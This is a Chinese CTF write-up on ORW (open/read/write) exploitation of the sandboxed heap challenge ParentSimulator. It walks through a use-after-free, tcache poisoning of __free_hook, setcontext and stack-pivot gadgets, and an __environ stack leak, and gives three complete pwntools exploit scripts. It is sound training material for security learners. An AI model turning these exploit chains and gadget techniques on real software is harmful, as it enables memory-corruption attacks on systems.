# PWN堆溢出技巧：ORW的解题手法与万金油Gadgets

阅读量 **422165**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-22 16:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01e29edbf7ff64811b.png)

> 现在PWN越来越卷，很多题目都有沙箱，需要ORW来读flag，本文以MAR DASCTF
> 2021中的ParentSimulator为例，由复杂到简单介绍几种ORW类题目的解题手法，以及一些好用的Gadgets,
> 此文主要面向和笔者一样的新手pwn师傅, 大佬请无视 XD

## ORW

`ORW`类题目是指程序开了沙箱保护，禁用了一些函数的调用（如 `execve`等），使得我们并不能正常 `get
shell`，只能通过`ROP`的方式调用`open`, `read`, `write`的来读取并打印`flag` 内容

    
    
    fd = open('/flag','r')
    read(fd,buf,len)
    write(1,buf,len)
    

###  查看沙箱

在实战中我们可以通过 `seccomp-tools`来查看程序是否启用了沙箱, `seccomp-tools`工具安装方法如下:

    
    
    $ sudo apt install gcc ruby-dev
    $ gem install seccomp-tools
    

安装完成后通过 `seccomp-tools dump ./pwn`即可查看程序沙箱

![](https://p1.ssl.qhimg.com/t0158ada8c0a923003f.png)

可以看到 `ParentSimulator`中禁用了 `execve`, 由于`system`函数实际上也是借由 `execve`实现的, 因此通过
`get shell`的方法来解决本题比较困难 ( 其实还是有方法的, 但不在此次咱们讨论的范围内 )

那么这时候就要用到 `ORW`了

## 思路

###  低版本

在 `Glibc2.29`以前的 `ORW`解题思路已经比较清晰了，主要是劫持 `free_hook` 或者 `malloc_hook`写入
`setcontext`函数中的 gadget，通过 `rdi`索引，来设置相关寄存器，并执行提前布置好的 `ORW ROP chains`

    
    
    <setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
    <setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]
    <setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]
    <setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]
    <setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]
    <setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]
    <setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]
    <setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
    <setcontext+94>:  push   rcx
    <setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]
    <setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]
    <setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]
    <setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]
    <setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]
    <setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]
    <setcontext+125>: xor    eax,eax
    <setcontext+127>: ret
    

###  高版本

但在 `Glibc 2.29`之后 `setcontext`中的gadget变成了以 `rdx`索引，因此如果我们按照之前思路的话，还要先通过
`ROP`控制 `RDX`的值，如下所示：

    
    
    .text:00000000000580DD                 mov     rsp, [rdx+0A0h]
    .text:00000000000580E4                 mov     rbx, [rdx+80h]
    .text:00000000000580EB                 mov     rbp, [rdx+78h]
    .text:00000000000580EF                 mov     r12, [rdx+48h]
    .text:00000000000580F3                 mov     r13, [rdx+50h]
    .text:00000000000580F7                 mov     r14, [rdx+58h]
    .text:00000000000580FB                 mov     r15, [rdx+60h]
    .text:00000000000580FF                 test    dword ptr fs:48h, 2
        ....
    .text:00000000000581C6                 mov     rcx, [rdx+0A8h]
    .text:00000000000581CD                 push    rcx
    .text:00000000000581CE                 mov     rsi, [rdx+70h]
    .text:00000000000581D2                 mov     rdi, [rdx+68h]
    .text:00000000000581D6                 mov     rcx, [rdx+98h]
    .text:00000000000581DD                 mov     r8, [rdx+28h]
    .text:00000000000581E1                 mov     r9, [rdx+30h]
    .text:00000000000581E5                 mov     rdx, [rdx+88h]
    .text:00000000000581EC                 xor     eax, eax
    .text:00000000000581EE                 retn
    

但如果搜索过相应gadgets的同学应该有感受， 很难找到能够直接控制rdx寄存器的gadgets，这时候就需要常备一些
`万金油`gadgets，具体的gadgets在下文结合题目解法一同介绍

## 题目

###  分析

题目链接如下：

链接：<https://pan.baidu.com/s/1qFcnn8p4iWgJyOB_1sgAFw>  
提取码：y895

首先分析一下题目，程序中可以 `创建`、`删除`、 `改名`、 `改描述`、`更改一次性别`、`退出`

据此可以分析出`chunk`的结构

    
    
    0x0 → pre_size
    
    0x8 → size
    
    0x10 → name
    
    0x18 → gender
    
    0x20 → des 
    
    .....
    

打开IDA分析一下程序的各个功能

####  创建

如图可以看出程序最多可以申请10个堆块，同时会维护两个数组，分别是`chunk_list`和`chunk_list_flag`,
其中前者储存申请的chunk地址，而后者则会依据申请堆块的序号把数组对应位置写为`1`

![](https://p5.ssl.qhimg.com/t018c4ec467d4a349b0.png)

####  改名

逻辑很简单，在改名前会检查`chunk_list_flag`对应位置是否为1

![](https://p2.ssl.qhimg.com/t01913dad36afad8ddc.png)

####  改描述

逻辑很简单，修改前也会检查 `chunk_list_flag`

![](https://p3.ssl.qhimg.com/t012e58e448f8b1f474.png)

####  改性别（只能一次）

这个函数就不太一样了，他在修改性别前没有检查`chunk_list_flag`，而且会先打印当前性别

试想一下，如果目标堆块处于 `tcache`中，那么修改性别就能泄露 `堆地址`

如果目标堆块处于 `unsort bin`中，那么修改性别就有可能泄露 `libc地址`

（不过其实出题人提供这个函数是为了降低难度，即便不调用这个函数也可以通过`double free`来泄露相关地址）

![](https://p2.ssl.qhimg.com/t01aafcd0a6ece4c504.png)

####  释放

程序的主要漏洞就出在释放函数中，可见函数并没有检查 `chunk_list_flag`，且释放后并没有将 `chunk_list`置0，存在uaf

![](https://p0.ssl.qhimg.com/t01ac610fd73acac4e5.png)

###  思路

经过上面的分析，我们的思路就很清楚了  
首先利用 `释放`功能中的漏洞进行 `double free`，构造堆块重叠从而泄露 `堆地址`和 `libc地址`

之后通过 `tcache投毒`向`free_hook`中写入gadget，使得用户在 `free`时可以通过
`free_hook`中布置的gadgets劫持程序执行流程到我们可控的地址

最后在可控的地址部署 `ORW`的 `ROP Chains`，执行 `free`，输出 `flag`

以上就是比较常规的思路，其中的难点就在于寻找合适的 gadgets来劫持控制流，下面我们来讲一下具体实现

###  解法1 Gadget+setcontext

解法一和上文介绍的思路完全相同

这其中用到的 `gadget`是 `getkeyserv_handle+576`，其汇编如下

    
    
    mov     rdx, [rdi+8]
    mov     [rsp+0C8h+var_C8], rax
    call    qword ptr [rdx+20h]
    

这个 `gadget`可以通过 `rdi` 来控制 `rdx`， 非常好用，而且从 Glibc2.29到2.32都可用

控制 `rdx`之后，我们就可以通过 `setcontext`来控制其他寄存器了

这里需要注意的是，根据我们分析的chunk结构， `rdi+8`位置的内容应该是 `性别`，因此我们在调用该gadget前需要先构造堆块重叠，控制
`rdi+8`的内容，详见EXP

####  EXP

    
    
    #!/usr/bin/python
    #coding=utf-8
    #__author__:N1K0_
    
    from pwn import *
    import inspect
    from sys import argv
    
    def leak(var):
        callers_local_vars = inspect.currentframe().f_back.f_locals.items()
        temp =  [var_name for var_name, var_val in callers_local_vars if var_val is var][0]
        p.info(temp + ': {:#x}'.format(var))
    
    s      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    r      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, b'\0'))
    uu64    = lambda data               :u64(data.ljust(8, b'\0'))
    plt     = lambda data               :elf.plt[data]
    got     = lambda data               :elf.got[data]
    sym     = lambda data               :libc.sym[data]
    itr     = lambda                    :p.interactive()
    
    local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
    local_libc_32 = '/lib/i386-linux-gnu/libc.so.6'
    remote_libc = ''
    binary = './pwn'
    context.binary = binary
    elf = ELF(binary,checksec=False)
    
    p = process(binary)
    if len(argv) > 1:
        if argv[1]=='r':
            p = remote('1',1)
    libc = elf.libc
    # libc = ELF(remote_libc)
    
    def dbg(cmd=''):
        os.system('tmux set mouse on')
        context.terminal = ['tmux','splitw','-h']
        gdb.attach(p,cmd)
        pause()
    
    """
    chunk_list = 0x40A0 
    chunk_list_flag = 0x04060
    gender_chance = 0x4010
    
    """
    # start 
    # context.log_level = 'DEBUG'
    
    def add(idx,sex,name):
        sla('>> ','1')
        sla('index?\n',str(idx))
        sla('2.Girl:\n',str(sex))
        sa("Please input your child's name:\n",name)
    def name_edit(idx,name):
        sla('>> ','2')
        sla('index',str(idx))
        sa('name:',name)
        ru('Done!\n')
    def show(idx):
        sla('>>','3')
        sla('index?',str(idx))
    def free(idx):
        sla('>>','4')
        sla('index?',str(idx))
    def change_sex(idx,sex):
        sla('>>','666')
        sla('index?',str(idx))
        ru('Current gender:')
        temp = uu64(r(6))
        sla('2.Girl:',str(sex))
        return temp
    def content_edit(idx,data):
        sla('>>','5')
        sla('index?',str(idx))
        sa('description:',data)
    def quit():
        sla('>>','6')
    
    # ----------------------------- 1 利用double free构造堆块重叠， 泄露heap和libc地址
    for i in range(10):
        add(i,1,'a')
    for i in range(7):
        free(6-i)
    # 合并进入usbin
    free(8)
    free(7)
    # 从tcache中取出第一块分配
    add(0,1,'1')
    # 将合并状态下的一部分chunk放入tcache，造成堆块重叠
    free(8)
    # 再次申请，使放入tcache中的usbin chunk被分配，泄露堆地址
    add(0,1,'1')
    free(8)
    show(0)
    ru('nder: ')
    heap_addr = uu64(r(6))
    leak(heap_addr)
    
    for i in range(1,9):
        add(i,1,'a')
    show(0)
    ru('nder: ')
    base = uu64(r(6))-0x1ebbe0
    leak(base)
    
    # --------------------------- 2 构造堆块重叠，使得可以向chunk+8位置写入数据；令在堆块上布置setcontext链
    open_addr  = base + sym('open')
    read_addr = base + sym('read')
    puts = base + sym('puts')
    gadget = base + 0x154930
    free_hook = base + sym('__free_hook')
    setcontext = base + sym('setcontext') + 61
    p_rdi_r = base + 0x26b72
    p_rdx_r12_r = base + 0x11c371
    p_rsi_r = base + 0x27529
    leak(free_hook)
    leak(gadget)
    
    add(9,1,'a')
    free(3)
    free(1)
    name_edit(0,p64(heap_addr+0x380)[:-1])
    add(8,1,'a')
    add(9,1,'a')
    pl = p64(0) + p64(0x111)
    pl+= p64(0) + p64(heap_addr+0x3a8-0x18) # 在chunk2的gender字段放置地址addr，令addr+0x28指向chunk2的des字段
    
    # setcontext
    """
    gadget 0x154930
        mov     rdx, [rdi+8]
        mov     [rsp+0C8h+var_C8], rax
        call    qword ptr [rdx+20h]
    """
    pl+= p64(setcontext)
    pl+= (0xa0-len(pl))*'\x00' + p64(heap_addr+0x5d0) + p64(p_rdi_r)
    content_edit(9,pl)
    
    # ----------------------------------------------- 3 set gadget into free_hook
    free(7)
    free(8)
    name_edit(0,p64(free_hook)[:-1])
    add(8,1,'a')
    add(7,1,p64(gadget)[:-1])
    # ---------------------------------------------- 4 在堆块中布置rop链
    pl = p64(heap_addr+0xb10) + p64(p_rsi_r) + p64(0) + p64(open_addr)
    # 这里要注意选择open返回的fd指针
    pl+= p64(p_rdi_r) + p64(4) + p64(p_rsi_r) + p64(heap_addr+0x500) + p64(p_rdx_r12_r) + p64(0x30)*2 + p64(read_addr)
    pl+= p64(p_rdi_r) + p64(heap_addr+0x500) + p64(puts)
    content_edit(4,pl)
    name_edit(0,'/flag\x00\x00')
    
    command = 'b *'+ str(hex(gadget))+'\n'
    dbg(command)
    # ---------------------------------------------- 5 trigger
    free(2)
    # end 
    itr()
    

###  解法2 – gadget+栈迁移

解法1思路很清晰，但又要控制 `rdx`又要构造 `setcontext`，很麻烦，在这里介绍另一种解法，通过
gadget控制rbp的值，从而进行栈迁移，将栈劫持到我们可以控制的堆地址上，并执行预先布置的rop链，从而获取flag

先介绍一下万金油的gadget `svcudp_reply+26`，汇编如下

    
    
        mov rbp, qword ptr [rdi + 0x48]; 
        mov rax, qword ptr [rbp + 0x18]; 
        lea r13, [rbp + 0x10]; 
        mov dword ptr [rbp + 0x10], 0; 
        mov rdi, r13; 
        call qword ptr [rax + 0x28];
    

这个gadgets主要是通过 `rdi`控制 `rbp`进而控制 `rax`并执行跳转，由于我们已经控制了 `rbp`的值，因此只需要在
`rax+0x28`的位置部署 `leave；ret`即可完成栈迁移

从而在我们已经布置好 `orw rop链`的位置伪造栈地址并劫持控制流，最终读取`flag`

在第一个解法中我并没有使用 `修改性别`的功能，而是全部通过堆块重叠来泄露地址，在这个解法中用到了
`修改性别`功能，其主要作用是可以更快捷的泄露地址，而且如果堆块已经被释放的话，`修改性别`会更改 `chunk+8`位置的指针，使得我们可以对其进行
`double free`

详见EXP

####  EXP

    
    
    #!/usr/bin/python
    #coding=utf-8
    #__author__:N1K0_
    
    from pwn import *
    import inspect
    from sys import argv
    
    def leak(var):
        callers_local_vars = inspect.currentframe().f_back.f_locals.items()
        temp =  [var_name for var_name, var_val in callers_local_vars if var_val is var][0]
        p.info(temp + ': {:#x}'.format(var))
    
    s      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    r      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, b'\0'))
    uu64    = lambda data               :u64(data.ljust(8, b'\0'))
    plt     = lambda data               :elf.plt[data]
    got     = lambda data               :elf.got[data]
    sym     = lambda data               :libc.sym[data]
    itr     = lambda                    :p.interactive()
    
    local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
    local_libc_32 = '/lib/i386-linux-gnu/libc.so.6'
    remote_libc = ''
    binary = './pwn'
    context.binary = binary
    elf = ELF(binary,checksec=False)
    
    p = process(binary)
    # p = process(["./pwn"], env={"LD_PRELOAD":"./libc-2.31.so"})
    if len(argv) > 1:
        if argv[1]=='r':
            p = remote('1',1)
    libc = elf.libc
    # libc = ELF(remote_libc)
    
    def dbg(cmd=''):
        os.system('tmux set mouse on')
        context.terminal = ['tmux','splitw','-h']
        gdb.attach(p,cmd)
        pause()
    
    """
    chunk_list = 0x40A0 
    chunk_list_flag = 0x04060
    gender_chance = 0x4010
    """
    
    # start 
    # context.log_level = 'DEBUG'
    
    def add(idx,sex,name):
        sla('>> ','1')
        sla('index?\n',str(idx))
        sla('2.Girl:\n',str(sex))
        sa("Please input your child's name:\n",name)
    def name_edit(idx,name):
        sla('>> ','2')
        sla('index',str(idx))
        sa('name:',name)
        ru('Done!\n')
    def show(idx):
        sla('>>','3')
        sla('index?',str(idx))
    def free(idx):
        sla('>>','4')
        sla('index?',str(idx))
    def change_sex(idx,sex):
        sla('>>','666')
        sla('index?',str(idx))
        ru('Current gender:')
        temp = uu64(r(6))
        sla('2.Girl:',str(sex))
        return temp
    def content_edit(idx,data):
        sla('>>','5')
        sla('index?',str(idx))
        sa('description:',data)
    def quit():
        sla('>>','6')
    
    # ----------------------------- 1 free and show; leak heap_addr
    for i in range(8):
        add(i,1,'aaaa\n')
    free(6)
    heap_addr = change_sex(6,2)
    # ---------------------------- 2 doble free 6; leak libc_base
    free(6) # double free
    add(6,1,'aa')
    add(8,1,'aa') # 8 ==6
    for i in range(6):
        free(i)
    free(7) # now tcache is full; next chunk will be in the usbin
    free(6)
    show(8)
    ru('Name: ')
    base = uu64(ru('\x7f',False)) - 0x1ebbe0
    # ---------------------------- 3 set gadget to free_hook
    gadget = base + 0x157d8a
    free_hook = base + sym('__free_hook')
    free_addr = base + sym('free')
    open_addr  = base + sym('open')
    read_addr = base + sym('read')
    puts = base + sym('puts')
    # ret -> mov rip, [rsp]; rsp + 8
    leave_r = base + 0x5aa48 # mov rsp, rbp; pop rbp
    P_rax_r = base + 0x4a550
    p_rsi_r = base + 0x27529
    p_rdi_r = base + 0x26b72
    p_rdx_r12_r = base + 0x11c371
    p_rdx_rbx_r = base + 0x162866
    P_rdx_rcx_rbx_r = base + 0x1056fd
    add_rsp_0x18_r=base + 0x3794a
    ret = base + 0x25679
    
    
    for i in range(6):
        add(i,1,'aa')
    add(7,1,'a')
    add(6,1,'b')
    # set 6 to tcache and 8 is still at the same position with 6
    free(7)
    free(6)
    # tcache poison
    name_edit(8,p64(free_hook)[:-1])
    add(6,1,'a')
    add(7,1,p64(gadget)[:-1])
    
    # -------------------------- 4 move stack to heap
    """
    0x157d8a
        mov rbp, qword ptr [rdi + 0x48]; 
        mov rax, qword ptr [rbp + 0x18]; 
        lea r13, [rbp + 0x10]; 
        mov dword ptr [rbp + 0x10], 0; 
        mov rdi, r13; 
        call qword ptr [rax + 0x28];
    """
    
    stack_addr = heap_addr + 0x900
    # set rbp = chunk_des 6
    pl = '/flag\x00'
    pl = pl.ljust(0x38,'a')
    pl+= p64(stack_addr)
    pl+= p64(leave_r) # rax + 0x28 call
    content_edit(0,pl)
    
    pl = p64(ret) + p64(add_rsp_0x18_r)*2
    pl+= p64(heap_addr + 0xa10+0x18) # rax
    pl+= '\x00'*0x8
    # --------------------------- 5 set orw ropchains on fakestack
    # orw chains
    # open
    pl+= p64(p_rdi_r)+p64(heap_addr+0x0a10)+p64(p_rsi_r)+p64(0)+p64(open_addr)
    # read
    pl+= p64(p_rdi_r)+p64(4)+p64(p_rsi_r)+p64(heap_addr+0x3d0)+p64(p_rdx_r12_r)+p64(0x30)*2+p64(read_addr)
    # puts
    pl+= p64(p_rdi_r)+p64(heap_addr+0x3d0)+p64(puts)
    content_edit(6,pl)
    
    leak(free_hook)
    leak(open_addr)
    leak(read_addr)
    leak(puts)
    leak(gadget)
    leak(heap_addr)
    leak(base)
    leak(leave_r)
    
    comm = 'b *' + str(hex(add_rsp_0x18_r))+'\n'
    comm+= 'b *' + str(hex(gadget)) + '\n'
    
    dbg(comm)
    
    # ---------------------------- 6 tigger
    free(0)
    
    # end 
    
    itr()
    

###  解法3 – 通过environ泄露栈地址，并在栈上构造orw rop链

在解法二当中我们是通过gadgets进行栈迁移，将原本的栈地址劫持到了堆上，但如果
`栈地址`已知的话，解题过程会更加简单，而且不需要特意去寻找万金油的gadgets

那么如何泄露`栈地址`呢？

其实程序的栈地址会存放在 `__environ`中，我们只要输出`__environ`的内容就能获取栈地址

在获取到栈地址后，我在main函数的 `ret`处下一个断点，发现main函数返回值和我们泄露的栈地址正好相差 `0x100`

![](https://p2.ssl.qhimg.com/t01772f415ba7258cd3.png)

之后的思路就比较清晰了，我们依旧通过 `tcache poison`的方式，将堆块申请到main函数返回的位置，布置 orw ropchain，之后通过
`退出`功能将程序控制流指向布置好的 ropchain，最后输出flag

详见EXP

    
    
    #!/usr/bin/python
    #coding=utf-8
    #__author__:N1K0_
    
    from pwn import *
    import inspect
    from sys import argv
    
    def leak(var):
        callers_local_vars = inspect.currentframe().f_back.f_locals.items()
        temp =  [var_name for var_name, var_val in callers_local_vars if var_val is var][0]
        p.info(temp + ': {:#x}'.format(var))
    
    s      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    r      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, b'\0'))
    uu64    = lambda data               :u64(data.ljust(8, b'\0'))
    plt     = lambda data               :elf.plt[data]
    got     = lambda data               :elf.got[data]
    sym     = lambda data               :libc.sym[data]
    itr     = lambda                    :p.interactive()
    
    local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
    local_libc_32 = '/lib/i386-linux-gnu/libc.so.6'
    remote_libc = ''
    binary = './pwn'
    context.binary = binary
    elf = ELF(binary,checksec=False)
    
    p = process(binary)
    if len(argv) > 1:
        if argv[1]=='r':
            p = remote('1',1)
    libc = elf.libc
    # libc = ELF(remote_libc)
    
    def dbg(cmd=''):
        os.system('tmux set mouse on')
        context.terminal = ['tmux','splitw','-h']
        gdb.attach(p,cmd)
        pause()
    
    """
    chunk_list = 0x40A0 
    chunk_list_flag = 0x04060
    gender_chance = 0x4010
    
    """
    
    # start 
    context.log_level = 'DEBUG'
    
    def add(idx,sex,name):
        sla('>> ','1')
        sla('index?\n',str(idx))
        sla('2.Girl:\n',str(sex))
        sa("Please input your child's name:\n",name)
    def name_edit(idx,name):
        sla('>> ','2')
        sla('index',str(idx))
        sa('name:',name)
        ru('Done!\n')
    def show(idx):
        sla('>>','3')
        sla('index?',str(idx))
    def free(idx):
        sla('>>','4')
        sla('index?',str(idx))
    def change_sex(idx,sex):
        sla('>>','666')
        sla('index?',str(idx))
        ru('Current gender:')
        temp = uu64(r(6))
        sla('2.Girl:',str(sex))
        return temp
    def content_edit(idx,data):
        sla('>>','5')
        sla('index?',str(idx))
        sa('description:',data)
    def quit():
        sla('>>','6')
    
    # ---------------------------- 1 构造double free；泄露libc、heap、environ；将堆块申请到environ泄露stack并计算出main ret
    for i in range(10):
        add(i,1,'aaaa')
    for i in range(7):
        free(6-i)
    free(7)
    free(8)
    add(0,1,'aaaa')
    free(8)
    add(0,1,'aaaa')
    for i in range(1,8):
        add(i,1,'aaaa')
    show(0)
    base = uu64(ru('\x7f',False)[-6:]) - 0x1ebbe0
    environ = base + sym('__environ')
    leak(base)
    leak(environ)
    add(8,1,'aaaa')
    free(9)
    free(8)
    name_edit(0,p64(environ-0x10)[:-1])
    add(8,1,'aaaa')
    add(9,1,'aaaa')
    show(9)
    stack_addr = uu64(ru('\x7f',False)[-6:])
    main_ret = stack_addr - 0x100
    leak(stack_addr)
    leak(main_ret)
    
    # ----------------------------------------2 利用double和tcache poison，将堆块申请到main ret并布置orw chains
    free(7)
    free(8)
    show(0)
    ru('Name: ')
    heap_addr = uu64(r(6))-0xa10
    leak(heap_addr)
    name_edit(0,p64(main_ret-0x10)[:-1])
    add(8,1,'/flag\x00\x00')
    add(7,1,'aa')
    
    p_rsi_r = base + 0x27529
    p_rdi_r = base + 0x26b72
    p_rdx_r12_r = base + 0x11c371
    open_addr  = base + sym('open')
    read_addr = base + sym('read')
    puts = base + sym('puts')
    # orw chains
    # open
    pl = p64(p_rdi_r)+p64(heap_addr+0x0b20)+p64(p_rsi_r)+p64(0)+p64(open_addr)
    # read
    pl+= p64(p_rdi_r)+p64(4)+p64(p_rsi_r)+p64(heap_addr+0x3d0)+p64(p_rdx_r12_r)+p64(0x30)*2+p64(read_addr)
    # puts
    pl+= p64(p_rdi_r)+p64(heap_addr+0x3d0)+p64(puts)
    content_edit(7,pl)
    #------------------------------------------3 trigger
    quit()
    # end
    itr()
    

## 参考

<https://shimo.im/docs/V1hLlJ0RoRkI7Si9>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **N1K0_** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/236832](/post/id/236832)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [堆溢出](/tag/堆溢出)
  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [ORW](/tag/ORW)

 **+1** __8赞

 __收藏

![](https://p0.ssl.qhimg.com/t0127b0cce4629fb16f.png) N1K0_

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

